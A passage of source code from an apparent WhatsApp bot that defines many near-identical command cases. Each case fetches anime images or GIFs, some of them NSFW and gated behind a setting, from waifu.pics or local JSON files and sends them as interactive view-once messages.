if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'zettai':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'gifblowjob':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video:bogif, gifPlayback:true }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
			case 'animeawoo':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
 let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animemegumin':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeshinobu':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehandhold':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehighfive':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecringe':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animedance':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehappy':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeglomp':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmug':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeblush':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewave':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmile':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepoke':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewink':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebonk':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebully':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeyeet':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebite':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animelick':{
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
